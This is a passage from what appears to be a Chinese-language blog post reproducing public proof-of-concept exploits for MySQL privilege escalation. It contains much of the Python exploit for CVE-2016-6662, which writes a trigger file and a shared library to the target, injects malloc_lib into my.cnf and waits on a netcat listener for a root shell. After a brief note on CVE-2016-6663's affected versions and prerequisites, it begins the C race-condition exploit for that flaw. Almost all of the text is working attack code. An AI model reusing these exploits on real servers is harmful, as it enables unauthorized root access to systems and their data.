data-num="61"></td><td><pre><span class="token comment"># CREATE requirement could be bypassed (malicious trigger could be attached to existing tables)</span></pre></td></tr><tr><td data-num="62"></td><td><pre>info<span class="token punctuation">(</span><span class="token string">"Connecting to target server %s and target mysql account '%s@%s' using DB '%s'"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>args<span class="token punctuation">.</span>TARGET_HOST<span class="token punctuation">,</span> args<span class="token punctuation">.</span>TARGET_USER<span class="token punctuation">,</span> args<span class="token punctuation">.</span>TARGET_HOST<span class="token punctuation">,</span> args<span class="token punctuation">.</span>TARGET_DB<span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="63"></td><td><pre><span class="token keyword">try</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="64"></td><td><pre>    dbconn <span class="token operator">=</span> mysql<span class="token punctuation">.</span>connector<span class="token punctuation">.</span>connect<span class="token punctuation">(</span>user<span class="token operator">=</span>args<span class="token punctuation">.</span>TARGET_USER<span class="token punctuation">,</span> password<span class="token operator">=</span>args<span class="token punctuation">.</span>TARGET_PASS<span class="token punctuation">,</span> database<span class="token operator">=</span>args<span class="token punctuation">.</span>TARGET_DB<span class="token punctuation">,</span> host<span class="token operator">=</span>args<span class="token punctuation">.</span>TARGET_HOST<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="65"></td><td><pre><span class="token keyword">except</span> mysql<span class="token punctuation">.</span>connector<span class="token punctuation">.</span>Error <span class="token keyword">as</span> err<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="66"></td><td><pre>    errmsg<span class="token punctuation">(</span><span class="token string">"Failed to connect to the target: &#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="67"></td><td><pre>    shutdown<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="68"></td><td><pre></pre></td></tr><tr><td data-num="69"></td><td><pre><span class="token keyword">try</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="70"></td><td><pre>    cursor <span class="token operator">=</span> dbconn<span class="token punctuation">.</span>cursor<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="71"></td><td><pre>    cursor<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token string">"SHOW GRANTS"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="72"></td><td><pre><span class="token keyword">except</span> mysql<span class="token punctuation">.</span>connector<span class="token punctuation">.</span>Error <span class="token keyword">as</span> err<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="73"></td><td><pre>    errmsg<span class="token punctuation">(</span><span class="token string">"Something went wrong: &#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="74"></td><td><pre>    shutdown<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="75"></td><td><pre></pre></td></tr><tr><td data-num="76"></td><td><pre>privs <span class="token operator">=</span> cursor<span class="token punctuation">.</span>fetchall<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="77"></td><td><pre>info<span class="token punctuation">(</span><span class="token string">"The account in use has the following grants/perms: "</span> <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="78"></td><td><pre><span class="token keyword">for</span> priv <span class="token keyword">in</span> privs<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="79"></td><td><pre>    <span class="token keyword">print</span> priv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="80"></td><td><pre><span class="token keyword">print</span> <span class="token string">""</span></pre></td></tr><tr><td data-num="81"></td><td><pre></pre></td></tr><tr><td data-num="82"></td><td><pre></pre></td></tr><tr><td data-num="83"></td><td><pre><span class="token comment"># Compile mysql_hookandroot_lib.so shared library that will eventually hook to the mysqld </span></pre></td></tr><tr><td data-num="84"></td><td><pre><span class="token comment"># process execution and run our code (Remote Root Shell)</span></pre></td></tr><tr><td data-num="85"></td><td><pre><span class="token comment"># Remember to match the architecture of the target (not your machine!) otherwise the library</span></pre></td></tr><tr><td data-num="86"></td><td><pre><span class="token comment"># will not load properly on the target.</span></pre></td></tr><tr><td data-num="87"></td><td><pre>info<span class="token punctuation">(</span><span class="token string">"Compiling mysql_hookandroot_lib.so"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="88"></td><td><pre>cmd <span class="token operator">=</span> <span class="token string">"gcc -Wall -fPIC -shared -o mysql_hookandroot_lib.so mysql_hookandroot_lib.c -ldl"</span></pre></td></tr><tr><td data-num="89"></td><td><pre>process <span class="token operator">=</span> subprocess<span class="token punctuation">.</span>Popen<span class="token punctuation">(</span>cmd<span class="token punctuation">,</span> shell<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> stdout<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>PIPE<span class="token punctuation">,</span> stderr<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>PIPE<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="90"></td><td><pre><span class="token punctuation">(</span>result<span class="token punctuation">,</span> error<span class="token punctuation">)</span> <span class="token operator">=</span> process<span class="token punctuation">.</span>communicate<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="91"></td><td><pre>rc <span class="token operator">=</span> process<span class="token punctuation">.</span>wait<span class="token punctuation">(</span><span class="token punctuation">)</span> </pre></td></tr><tr><td data-num="92"></td><td><pre><span class="token keyword">if</span> rc <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="93"></td><td><pre>    errmsg<span class="token punctuation">(</span><span class="token string">"Failed to compile mysql_hookandroot_lib.so: %s"</span> <span class="token operator">%</span> cmd<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="94"></td><td><pre>    <span class="token keyword">print</span> error </pre></td></tr><tr><td data-num="95"></td><td><pre>    shutdown<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="96"></td><td><pre></pre></td></tr><tr><td data-num="97"></td><td><pre><span class="token comment"># Load mysql_hookandroot_lib.so library and encode it into HEX</span></pre></td></tr><tr><td data-num="98"></td><td><pre>info<span class="token punctuation">(</span><span class="token string">"Converting mysql_hookandroot_lib.so into HEX"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="99"></td><td><pre>hookandrootlib_path <span class="token operator">=</span> <span class="token string">'./mysql_hookandroot_lib.so'</span></pre></td></tr><tr><td data-num="100"></td><td><pre><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>hookandrootlib_path<span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="101"></td><td><pre>    content <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="102"></td><td><pre>    hookandrootlib_hex <span class="token operator">=</span> binascii<span class="token punctuation">.</span>hexlify<span class="token punctuation">(</span>content<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="103"></td><td><pre></pre></td></tr><tr><td data-num="104"></td><td><pre><span class="token comment"># Trigger payload that will elevate user privileges and sucessfully execute SET GLOBAL GENERAL_LOG </span></pre></td></tr><tr><td data-num="105"></td><td><pre><span class="token comment"># in spite of the lack of SUPER/admin privileges (attacker only needs SELECT/FILE privileges).</span></pre></td></tr><tr><td data-num="106"></td><td><pre><span class="token comment"># Decoded payload (paths may differ) will look similar to:</span></pre></td></tr><tr><td data-num="107"></td><td><pre><span class="token triple-quoted-string string">"""</span></pre></td></tr><tr><td data-num="108"></td><td><pre>DELIMITER //</pre></td></tr><tr><td data-num="109"></td><td><pre>CREATE DEFINER=`root`@`localhost` TRIGGER appendToConf</pre></td></tr><tr><td data-num="110"></td><td><pre>AFTER INSERT</pre></td></tr><tr><td data-num="111"></td><td><pre>   ON `poctable` FOR EACH ROW</pre></td></tr><tr><td data-num="112"></td><td><pre>BEGIN</pre></td></tr><tr><td data-num="113"></td><td><pre></pre></td></tr><tr><td data-num="114"></td><td><pre>   DECLARE void varchar(550);</pre></td></tr><tr><td data-num="115"></td><td><pre>   set global general_log_file='/var/lib/mysql/my.cnf';</pre></td></tr><tr><td data-num="116"></td><td><pre>   set global general_log = on;</pre></td></tr><tr><td data-num="117"></td><td><pre>   select "</pre></td></tr><tr><td data-num="118"></td><td><pre></pre></td></tr><tr><td data-num="119"></td><td><pre># 0ldSQL_MySQL_RCE_exploit got here :)</pre></td></tr><tr><td data-num="120"></td><td><pre></pre></td></tr><tr><td data-num="121"></td><td><pre>[mysqld]</pre></td></tr><tr><td data-num="122"></td><td><pre>malloc_lib='/var/lib/mysql/mysql_hookandroot_lib.so'</pre></td></tr><tr><td data-num="123"></td><td><pre></pre></td></tr><tr><td data-num="124"></td><td><pre>[abyss]</pre></td></tr><tr><td data-num="125"></td><td><pre>" INTO void;   </pre></td></tr><tr><td data-num="126"></td><td><pre>   set global general_log = off;</pre></td></tr><tr><td data-num="127"></td><td><pre></pre></td></tr><tr><td data-num="128"></td><td><pre>END; //</pre></td></tr><tr><td data-num="129"></td><td><pre>DELIMITER ;</pre></td></tr><tr><td data-num="130"></td><td><pre>"""</pre></td></tr><tr><td data-num="131"></td><td><pre>trigger_payload<span class="token operator">=</span><span class="token triple-quoted-string string">"""TYPE=TRIGGERS</span></pre></td></tr><tr><td data-num="132"></td><td><pre>triggers='CREATE DEFINER=`root`@`localhost` TRIGGER appendToConf\\nAFTER INSERT\\n   ON `poctable` FOR EACH ROW\\nBEGIN\\n\\n   DECLARE void varchar(550);\\n   set global general_log_file=\\'%s\\';\\n   set global general_log = on;\\n   select "\\n\\n# 0ldSQL_MySQL_RCE_exploit got here :)\\n\\n[mysqld]\\nmalloc_lib=\\'%s\\'\\n\\n[abyss]\\n" INTO void;   \\n   set global general_log = off;\\n\\nEND'</pre></td></tr><tr><td data-num="133"></td><td><pre>sql_modes=0</pre></td></tr><tr><td data-num="134"></td><td><pre>definers='root@localhost'</pre></td></tr><tr><td data-num="135"></td><td><pre>client_cs_names='utf8'</pre></td></tr><tr><td data-num="136"></td><td><pre>connection_cl_names='utf8_general_ci'</pre></td></tr><tr><td data-num="137"></td><td><pre>db_cl_names='latin1_swedish_ci'</pre></td></tr><tr><td data-num="138"></td><td><pre>""" <span class="token operator">%</span> <span class="token punctuation">(</span>args<span class="token punctuation">.</span>TARGET_MYCNF<span class="token punctuation">,</span> malloc_lib_path<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="139"></td><td><pre></pre></td></tr><tr><td data-num="140"></td><td><pre><span class="token comment"># Convert trigger into HEX to pass it to unhex() SQL function</span></pre></td></tr><tr><td data-num="141"></td><td><pre>trigger_payload_hex <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token string">"&#123;:02x&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">for</span> c <span class="token keyword">in</span> trigger_payload<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="142"></td><td><pre></pre></td></tr><tr><td data-num="143"></td><td><pre><span class="token comment"># Save trigger into a trigger file</span></pre></td></tr><tr><td data-num="144"></td><td><pre>TRG_path<span class="token operator">=</span><span class="token string">"/var/lib/mysql/%s/poctable.TRG"</span> <span class="token operator">%</span> args<span class="token punctuation">.</span>TARGET_DB</pre></td></tr><tr><td data-num="145"></td><td><pre>info<span class="token punctuation">(</span><span class="token string">"Saving trigger payload into %s"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>TRG_path<span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="146"></td><td><pre><span class="token keyword">try</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="147"></td><td><pre>    cursor <span class="token operator">=</span> dbconn<span class="token punctuation">.</span>cursor<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="148"></td><td><pre>    cursor<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token triple-quoted-string string">"""SELECT unhex("%s") INTO DUMPFILE '%s' """</span> <span class="token operator">%</span> <span class="token punctuation">(</span>trigger_payload_hex<span class="token punctuation">,</span> TRG_path<span class="token punctuation">)</span> <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="149"></td><td><pre><span class="token keyword">except</span> mysql<span class="token punctuation">.</span>connector<span class="token punctuation">.</span>Error <span class="token keyword">as</span> err<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="150"></td><td><pre>    errmsg<span class="token punctuation">(</span><span class="token string">"Something went wrong: &#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="151"></td><td><pre>    shutdown<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="152"></td><td><pre></pre></td></tr><tr><td data-num="153"></td><td><pre><span class="token comment"># Save library into a trigger file</span></pre></td></tr><tr><td data-num="154"></td><td><pre>info<span class="token punctuation">(</span><span class="token string">"Dumping shared library into %s file on the target"</span> <span class="token operator">%</span> malloc_lib_path<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="155"></td><td><pre><span class="token keyword">try</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="156"></td><td><pre>    cursor <span class="token operator">=</span> dbconn<span class="token punctuation">.</span>cursor<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="157"></td><td><pre>    cursor<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token triple-quoted-string string">"""SELECT unhex("%s") INTO DUMPFILE '%s' """</span> <span class="token operator">%</span> <span class="token punctuation">(</span>hookandrootlib_hex<span class="token punctuation">,</span> malloc_lib_path<span class="token punctuation">)</span> <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="158"></td><td><pre><span class="token keyword">except</span> mysql<span class="token punctuation">.</span>connector<span class="token punctuation">.</span>Error <span class="token keyword">as</span> err<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="159"></td><td><pre>    errmsg<span class="token punctuation">(</span><span class="token string">"Something went wrong: &#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="160"></td><td><pre>    shutdown<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="161"></td><td><pre></pre></td></tr><tr><td data-num="162"></td><td><pre><span class="token comment"># Creating table poctable so that /var/lib/mysql/pocdb/poctable.TRG trigger gets loaded by the server</span></pre></td></tr><tr><td data-num="163"></td><td><pre>info<span class="token punctuation">(</span><span class="token string">"Creating table 'poctable' so that injected 'poctable.TRG' trigger gets loaded"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="164"></td><td><pre><span class="token keyword">try</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="165"></td><td><pre>    cursor <span class="token operator">=</span> dbconn<span class="token punctuation">.</span>cursor<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="166"></td><td><pre>    cursor<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token string">"CREATE TABLE `poctable` (line varchar(600)) ENGINE='MyISAM'"</span>  <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="167"></td><td><pre><span class="token keyword">except</span> mysql<span class="token punctuation">.</span>connector<span class="token punctuation">.</span>Error <span class="token keyword">as</span> err<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="168"></td><td><pre>    errmsg<span class="token punctuation">(</span><span class="token string">"Something went wrong: &#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="169"></td><td><pre>    shutdown<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="170"></td><td><pre></pre></td></tr><tr><td data-num="171"></td><td><pre><span class="token comment"># Finally, execute the trigger's payload by inserting anything into `poctable`. </span></pre></td></tr><tr><td data-num="172"></td><td><pre><span class="token comment"># The payload will write to the mysql config file at this point.</span></pre></td></tr><tr><td data-num="173"></td><td><pre>info<span class="token punctuation">(</span><span class="token string">"Inserting data to `poctable` in order to execute the trigger and write data to the target mysql config %s"</span> <span class="token operator">%</span> args<span class="token punctuation">.</span>TARGET_MYCNF <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="174"></td><td><pre><span class="token keyword">try</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="175"></td><td><pre>    cursor <span class="token operator">=</span> dbconn<span class="token punctuation">.</span>cursor<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="176"></td><td><pre>    cursor<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token string">"INSERT INTO `poctable` VALUES('execute the trigger!');"</span> <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="177"></td><td><pre><span class="token keyword">except</span> mysql<span class="token punctuation">.</span>connector<span class="token punctuation">.</span>Error <span class="token keyword">as</span> err<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="178"></td><td><pre>    errmsg<span class="token punctuation">(</span><span class="token string">"Something went wrong: &#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="179"></td><td><pre>    shutdown<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="180"></td><td><pre></pre></td></tr><tr><td data-num="181"></td><td><pre><span class="token comment"># Check on the config that was just created</span></pre></td></tr><tr><td data-num="182"></td><td><pre>info<span class="token punctuation">(</span><span class="token string">"Showing the contents of %s config to verify that our setting (malloc_lib) got injected"</span> <span class="token operator">%</span> args<span class="token punctuation">.</span>TARGET_MYCNF <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="183"></td><td><pre><span class="token keyword">try</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="184"></td><td><pre>    cursor <span class="token operator">=</span> dbconn<span class="token punctuation">.</span>cursor<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="185"></td><td><pre>    cursor<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token string">"SELECT load_file('%s')"</span> <span class="token operator">%</span> args<span class="token punctuation">.</span>TARGET_MYCNF<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="186"></td><td><pre><span class="token keyword">except</span> mysql<span class="token punctuation">.</span>connector<span class="token punctuation">.</span>Error <span class="token keyword">as</span> err<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="187"></td><td><pre>    errmsg<span class="token punctuation">(</span><span class="token string">"Something went wrong: &#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="188"></td><td><pre>    shutdown<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="189"></td><td><pre><span class="token keyword">finally</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="190"></td><td><pre>    dbconn<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># Close DB connection</span></pre></td></tr><tr><td data-num="191"></td><td><pre><span class="token keyword">print</span> <span class="token string">""</span></pre></td></tr><tr><td data-num="192"></td><td><pre>myconfig <span class="token operator">=</span> cursor<span class="token punctuation">.</span>fetchall<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="193"></td><td><pre><span class="token keyword">print</span> myconfig<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="194"></td><td><pre>info<span class="token punctuation">(</span><span class="token string">"Looks messy? Have no fear, the preloaded lib mysql_hookandroot_lib.so will clean up all the mess before mysqld daemon even reads it :)"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="195"></td><td><pre></pre></td></tr><tr><td data-num="196"></td><td><pre><span class="token comment"># Spawn a Shell listener using netcat on 6033 (inverted 3306 mysql port so easy to remember ;)</span></pre></td></tr><tr><td data-num="197"></td><td><pre>info<span class="token punctuation">(</span><span class="token string">"Everything is set up and ready. Spawning netcat listener and waiting for MySQL daemon to get restarted to get our rootshell... :)"</span> <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="198"></td><td><pre>listener <span class="token operator">=</span> subprocess<span class="token punctuation">.</span>Popen<span class="token punctuation">(</span>args<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"/bin/nc"</span><span class="token punctuation">,</span> <span class="token string">"-lvp"</span><span class="token punctuation">,</span><span class="token string">"6033"</span><span class="token punctuation">]</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="199"></td><td><pre>listener<span class="token punctuation">.</span>communicate<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="200"></td><td><pre><span class="token keyword">print</span> <span class="token string">""</span></pre></td></tr><tr><td data-num="201"></td><td><pre></pre></td></tr><tr><td data-num="202"></td><td><pre><span class="token comment"># Show config again after all the action is done</span></pre></td></tr><tr><td data-num="203"></td><td><pre>info<span class="token punctuation">(</span><span class="token string">"Shell closed. Hope you had fun. "</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="204"></td><td><pre></pre></td></tr><tr><td data-num="205"></td><td><pre><span class="token comment"># Mission complete, but just for now... Stay tuned :)</span></pre></td></tr><tr><td data-num="206"></td><td><pre>info<span class="token punctuation">(</span><span class="token triple-quoted-string string">"""Stay tuned for the CVE-2016-6663 advisory and/or a complete PoC that can craft a new valid my.cnf (i.e no writable my.cnf required) ;)"""</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="207"></td><td><pre></pre></td></tr><tr><td data-num="208"></td><td><pre></pre></td></tr><tr><td data-num="209"></td><td><pre><span class="token comment"># Shutdown</span></pre></td></tr><tr><td data-num="210"></td><td><pre>shutdown<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span></pre></td></tr></table></figure><h3 id="拓展"><a class="anchor" href="#拓展">#</a> 拓展</h3><p>上面的 CVE-2016-6662，可以将 mysql 权限提升为 root 权限，这里简单记录一下 CVE-2016-6663</p><h4 id="cve-2016-6663"><a class="anchor" href="#cve-2016-6663">#</a> CVE-2016-6663</h4><p>该漏洞可以从 www-data 提升到 mysql 权限</p><p>影响 MySQL 版本：</p><ul><li>&lt;= 5.5.51</li><li>&lt;= 5.6.32</li><li>&lt;= 5.7.14</li></ul><p>利用条件：</p><ul><li>获得了一个 www-data 权限</li><li>与目标主机有交互环境</li><li>已经拿到了一个低权限（CREATE/INSERT/SELECT 权限）的 MySQL 账户的用户名和密码</li></ul><p>利用脚本：<span class="exturl" data-url="aHR0cHM6Ly9sZWdhbGhhY2tlcnMuY29tL2Fkdmlzb3JpZXMvTXlTUUwtTWFyaWEtUGVyY29uYS1Qcml2RXNjUmFjZS1DVkUtMjAxNi02NjYzLTU2MTYtRXhwbG9pdC5odG1sJUVGJUJDJThDJUU1JUE2JTgyJUU0JUI4JThC">https://legalhackers.com/advisories/MySQL-Maria-Percona-PrivEscRace-CVE-2016-6663-5616-Exploit.html，如下</span></p><figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;fcntl.h></span></span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;grp.h></span></span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;mysql.h></span></span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;pwd.h></span></span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdint.h></span></span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span></pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/inotify.h></span></span></pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/stat.h></span></span></pre></td></tr><tr><td data-num="11"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/types.h></span></span></pre></td></tr><tr><td data-num="12"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/wait.h></span></span></pre></td></tr><tr><td data-num="13"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;time.h></span></span></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span></pre></td></tr><tr><td data-num="15"></td><td><pre></pre></td></tr><tr><td data-num="16"></td><td><pre></pre></td></tr><tr><td data-num="17"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">EXP_PATH</span>          <span class="token string">"/tmp/mysql_privesc_exploit"</span></span></pre></td></tr><tr><td data-num="18"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">EXP_DIRN</span>          <span class="token string">"mysql_privesc_exploit"</span></span></pre></td></tr><tr><td data-num="19"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">MYSQL_TAB_FILE</span>    <span class="token expression">EXP_PATH </span><span class="token string">"/exploit_table.MYD"</span></span></pre></td></tr><tr><td data-num="20"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">MYSQL_TEMP_FILE</span>   <span class="token expression">EXP_PATH </span><span class="token string">"/exploit_table.TMD"</span></span></pre></td></tr><tr><td data-num="21"></td><td><pre></pre></td></tr><tr><td data-num="22"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">SUID_SHELL</span>   	  <span class="token expression">EXP_PATH </span><span class="token string">"/mysql_suid_shell.MYD"</span></span></pre></td></tr><tr><td data-num="23"></td><td><pre></pre></td></tr><tr><td data-num="24"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">MAX_DELAY</span> <span class="token expression"><span class="token number">1000</span>    </span><span class="token comment">// can be used in the race to adjust the timing if necessary</span></span></pre></td></tr><tr><td data-num="25"></td><td><pre></pre></td></tr><tr><td data-num="26"></td><td><pre>MYSQL <span class="token operator">*</span>conn<span class="token punctuation">;</span>		  <span class="token comment">// DB handles</span></pre></td></tr><tr><td data-num="27"></td><td><pre>MYSQL_RES <span class="token operator">*</span>res<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="28"></td><td><pre>MYSQL_ROW row<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="29"></td><td><pre></pre></td></tr><tr><td data-num="30"></td><td><pre><span class="token keyword">unsigned</span> <span class="token keyword">long</span> cnt<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="31"></td><td><pre></pre></td></tr><tr><td data-num="32"></td><td><pre></pre></td></tr><tr><td data-num="33"></td><td><pre><span class="token keyword">void</span> <span class="token function">intro</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="34"></td><td><pre></pre></td></tr><tr><td data-num="35"></td><td><pre><span class="token function">printf</span><span class="token punctuation">(</span> </pre></td></tr><tr><td data-num="36"></td><td><pre>        <span class="token string">"\033[94m\n"</span></pre></td></tr><tr><td data-num="37"></td><td><pre>        <span class="token string">"MySQL/Percona/MariaDB - Privilege Escalation / Race Condition PoC Exploit\n"</span></pre></td></tr><tr><td data-num="38"></td><td><pre>        <span class="token string">"mysql-privesc-race.c (ver. 1.0)\n\n"</span></pre></td></tr><tr><td data-num="39"></td><td><pre>        <span class="token string">"CVE-2016-6663 / CVE-2016-5616\n\n"</span></pre></td></tr><tr><td data-num="40"></td><td><pre>        <span class="token string">"For testing purposes only. 